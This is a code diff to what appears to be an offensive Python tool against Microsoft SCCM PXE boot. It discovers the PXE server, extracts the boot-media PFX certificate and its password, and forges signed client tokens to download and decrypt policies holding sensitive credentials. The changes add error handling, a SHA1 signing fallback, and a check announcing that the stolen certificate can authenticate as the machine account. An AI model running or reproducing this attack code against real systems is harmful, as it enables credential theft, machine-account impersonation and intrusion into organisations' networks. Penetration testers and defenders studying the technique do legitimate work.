@@ -21,12 +21,17 @@ import lxml.etree as ET
 import requests
 from requests_toolbelt import MultipartEncoder,MultipartDecoder
 import zlib
+import sys
 import datetime
 from os import walk,system
 from ipaddress import IPv4Network,IPv4Address
 from certipy.lib.certificate import load_pfx
 from sccmwtf import SCCMTools, Tools, CryptoTools, policyBody, msgHeaderPolicy, msgHeader, dateFormat1
 from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.hazmat.primitives.serialization import pkcs12
+from cryptography.x509.oid import ExtensionOID, ObjectIdentifier
+from cryptography.hazmat.backends import default_backend
+from cryptography.x509 import DNSName
 import tftpy
 from asn1crypto import cms
 import hexdump
@@ -181,7 +186,10 @@ def find_pxe_server():
         packet = ans
 
         # Pull out DHCP offer from received answer packet
-        dhcp_options = packet[1][DHCP].options
+        try: # try packet[0] instead as suggested by onSec-fr
+            dhcp_options = packet[1][DHCP].options
+        except:
+            dhcp_options = packet[0][DHCP].options
         
         tftp_server = next((opt[1] for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == "tftp_server_name"),None)
         if tftp_server:
@@ -224,10 +232,17 @@ def get_variable_file_path(tftp_server):
     encrypted_key = None
     if ans:
         packet = ans
-        dhcp_options = packet[1][DHCP].options
+        try:  # try packet[0] instead as suggested by onSec-fr
+            dhcp_options = packet[1][DHCP].options
+        except:
+            dhcp_options = packet[0][DHCP].options
     
         #Does the received packet contain DHCP Option 243? DHCP option 243 is used by SCCM to send the variable file location
-        option_number, variables_file = next(opt for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == 243) 
+        try:
+            option_number, variables_file = next(
+                opt for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == 243)
+        except:
+            variables_file = None
         if variables_file:
             packet_type = variables_file[0] #First byte of the option data determines the type of data that follows
             data_length = variables_file[1] #Second byte of the option data is the length of data that follows
@@ -511,8 +526,42 @@ def use_encrypted_key(encrypted_key, media_file_path):
     
     print("[!] Writing _SMSTSMediaPFX to "+ filename + ". Certificate password is " + smsMediaGuid)
     write_to_binary_file(filename,smsTSMediaPFX)
-
+    check_clientauthcert(filename, smsMediaGuid)
     process_pxe_bootable_and_prestaged_media(media_variables)
+
+
+def check_clientauthcert(certificate, password):
+    # Check if certificate contains client auth
+    subject = None
+    pfx_file = certificate
+    pfx_password = bytes(password, encoding= 'utf-8')
+    # Read PFX
+    with open(pfx_file, "rb") as f:
+        pfx_data = f.read()
+    private_key, certificate, additional_certificates = pkcs12.load_key_and_certificates(pfx_data, pfx_password, backend=default_backend())
+    subject = certificate.subject
+    if subject.rdns:
+        subject = subject.rdns
+    else:
+        try:
+            san_extension = certificate.extensions.get_extension_for_oid(ExtensionOID.SUBJECT_ALTERNATIVE_NAME)
+            san = san_extension.value
+            dns_names = san.get_values_for_type(DNSName)
+            if dns_names:
+                subject = dns_names[0]
+        except Exception as e:
+            print(e)
+
+    # Check OID 1.3.6.1.5.5.7.3.2 (clientAuth)
+    try:
+        extended_key_usage_extension = certificate.extensions.get_extension_for_oid(ExtensionOID.EXTENDED_KEY_USAGE)
+        extended_key_usage = extended_key_usage_extension.value
+        client_auth_oid = ObjectIdentifier("1.3.6.1.5.5.7.3.2")
+        if client_auth_oid in extended_key_usage:
+            print("[!] PFX - Client Authentication is enabled for subject " + subject + ". You can try to use it to authenticate as the machine account!")
+    except Exception as e:
+        print(e)
+
 
 #Parse the downloaded task sequences and extract sensitive data if present
 def dowload_and_decrypt_policies_using_certificate(guid,cert_bytes):
@@ -526,35 +575,32 @@ def dowload_and_decrypt_policies_using_certificate(guid,cert_bytes):
     print('[+] Generating Client Authentication headers using PFX File...')
 
     data = CCMClientID.encode("utf-16-le") + b'\x00\x00'
+    # CCMClientIDSignature = generateSignedData(data,cryptoProv)
     try:
         CCMClientIDSignature = str(generateClientTokenSignature(data, cryptoProv))
-        print("[+] CCMClientID Signature Generated")
+    except:
+        print("[+] Error generating SHA256 CCMClientIDSignature - Trying SHA1...")
+        CCMClientIDSignature = generateSignedData(data, cryptoProv)
+    print("[+] CCMClientID Signature Generated")
 
-        CCMClientTimestamp = datetime.datetime.utcnow().replace(microsecond=0).isoformat() + 'Z'
-        data = CCMClientTimestamp.encode("utf-16-le") + b'\x00\x00'
+    CCMClientTimestamp = datetime.datetime.utcnow().replace(microsecond=0).isoformat() + 'Z'
+    data = CCMClientTimestamp.encode("utf-16-le") + b'\x00\x00'
+    # CCMClientTimestampSignature = generateSignedData(data,cryptoProv)
+    try:
         CCMClientTimestampSignature = str(generateClientTokenSignature(data, cryptoProv))
-        print("[+] CCMClientTimestamp Signature Generated")
+    except:
+        print("[+] Error generating SHA256 CCMClientTimestampSignature - Trying SHA1...")
+        CCMClientTimestampSignature = generateSignedData(data, cryptoProv)
+    print("[+] CCMClientTimestamp Signature Generated")
 
-        data = (CCMClientID + ';' + CCMClientTimestamp + "\0").encode("utf-16-le")
+    data = (CCMClientID + ';' + CCMClientTimestamp + "\0").encode("utf-16-le")
+    # clientTokenSignature = str(generateSignedData(data,cryptoProv))
+    try:
         clientTokenSignature = str(generateClientTokenSignature(data, cryptoProv))
-        print("[+] ClientToken Signature Generated")
-    except BaseException as e:
-        if "Invalid algorithm specified" in e:
-            print("Error. Trying again with SHA1 instead of SHA256.")
-
-            CCMClientIDSignature = generateSignedData(data,cryptoProv)
-            print("[+] CCMClientID Signature Generated")
-
-            CCMClientTimestamp = datetime.datetime.utcnow().replace(microsecond=0).isoformat() + 'Z'
-            data = CCMClientTimestamp.encode("utf-16-le") + b'\x00\x00'
-            CCMClientTimestampSignature = generateSignedData(data,cryptoProv)
-            print("[+] CCMClientTimestamp Signature Generated")
-
-            data = (CCMClientID + ';' + CCMClientTimestamp + "\0").encode("utf-16-le")
-            clientTokenSignature = str(generateSignedData(data,cryptoProv))
-            print("[+] ClientToken Signature Generated")
-        else:
-            print(e)
+    except:
+        print("[+] Error generating SHA256 clientTokenSignature - Trying SHA1...")
+        clientTokenSignature = str(generateSignedData(data, cryptoProv))
+    print("[+] ClientToken Signature Generated")
     
     try:
         naaConfigs, tsConfigs, colsettings = make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID,CCMClientIDSignature,CCMClientTimestamp,CCMClientTimestampSignature,clientTokenSignature,key)
@@ -940,7 +986,7 @@ if __name__ == "__main__":
     
         print("[!] Writing _SMSTSMediaPFX to "+ filename + ". Certificate password is " + smsMediaGuid)
         write_to_binary_file(filename,smsTSMediaPFX)
-    
+        check_clientauthcert(filename, smsMediaGuid)
         process_pxe_bootable_and_prestaged_media(media_variables)
 
     elif int(sys.argv[1]) == 4:
